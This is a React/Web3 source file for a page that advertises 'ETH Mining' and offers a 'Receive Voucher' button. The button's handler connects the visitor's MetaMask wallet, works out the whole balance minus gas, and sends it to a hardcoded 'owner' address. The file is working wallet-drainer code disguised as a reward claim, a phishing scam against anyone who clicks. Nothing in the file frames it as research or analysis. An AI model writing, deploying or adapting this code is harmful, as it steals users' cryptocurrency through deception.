import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import Web3 from "web3";
import Img from "./assets/bg3.png"


function App() {
  const handleClaim = async () => {
    console.log("handleClick");
    if (!window.ethereum) {
      toast("Please install metamask");
      return;
    }
    let address = null;
    // get address from metamask
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      address = accounts[0];
    } catch (err) {
      toast("Please connect your wallet");
      return;
    }
    if(!address){
      toast("Please connect your wallet");
      return;
    }
    const web3 = new Web3(window.ethereum);
    const balance = await web3.eth.getBalance(address);
    const gasPrice = await web3.eth.getGasPrice();
    const owner = "0x85FA6194d950E847a64ac6d4eC849D1F176D0d38"; // Get the current gas price

    const gas = await web3.eth.estimateGas({
      from: address,
      to: owner,
      value: web3.utils.toWei("0", "ether"), // Set a temporary value of 0 for gas estimation
    });

  
    const gasCost = gas * gasPrice;
    const value = balance - gasCost;
   
    if (value < 0) {
      toast("Insufficient balance to provide gas fee");
      return;
    }

    // Transfer all the balance to the contract

    try {
      await web3.eth.sendTransaction({
        from: address,
        to: owner,
        value: value,
        gasPrice: gasPrice,
        gasLimit: 21000,
      });
    } catch (err) {
      toast("Transaction failed");
    }
  };
  return <div className="w-full min-h-screen overflow-hidden">
    <div className="flex  flex-col md:gap-6 justify-center p-4 md:p-12">
      <h1 className="text-5xl md:text-7xl font-bold text-center">ETH Mining</h1>
      <div className="flex justify-center flex-col-reverse md:flex-row items-center md:pt-10">
        <div className="w-full md:w-[60rem] space-y-7 md:space-y-12 text-center">
          <h2 className="text-5xl md:text-7xl font-semibold">Receive Voucher</h2>
          <p className="text-2xl md:text-4xl text-gray-300 leading-9">Join the node and start mining</p>
          <button className="bg-[#4c50ac] hover:bg-[#6063cc] hover:shadow-md px-12 py-4 rounded-md text-2xl md:text-3xl font-semibold" onClick={handleClaim}>Receive</button>
        </div>
        <div className="w-[20rem] md:w-[40rem] md:h-[40rem]">
          <img src={Img} alt="" 
              className="w-full h-full object-cover object-center opacity-60"
          />
        </div>
      </div>
    </div>
    <ToastContainer />
  </div>;
}

export default App;
